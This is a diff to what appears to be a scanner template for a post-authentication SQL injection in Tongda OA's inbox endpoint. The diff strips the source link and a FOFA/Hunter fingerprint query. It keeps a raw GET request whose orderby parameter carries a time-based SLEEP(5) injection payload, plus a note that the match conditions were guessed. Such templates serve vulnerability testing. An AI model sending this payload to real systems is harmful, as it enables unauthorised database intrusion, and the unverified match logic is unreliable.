@@ -3,14 +3,8 @@ info:
   name: 通达OAinbox存在后台SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/25935cccd529fb46cee00daa9338d357
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 25935cccd529fb46cee00daa9338d357
-    fofa: + hunter`app.name="通达 OA"`
 http:
 - raw:
   - 'GET /general/email/inbox/get_index_data.php?asc=0&boxid=&boxname=inbox&curnum=0&emailtype=ALLMAIL&keyword=&orderby=-@%60%27%60%20%20AND%20%28SELECT%205386%20FROM%20%28SELECT%28SLEEP%285%29%29%29rmup%29--%20%27%20&pagelimit=10&tag=&timestamp=1598069103&total= HTTP/1.1
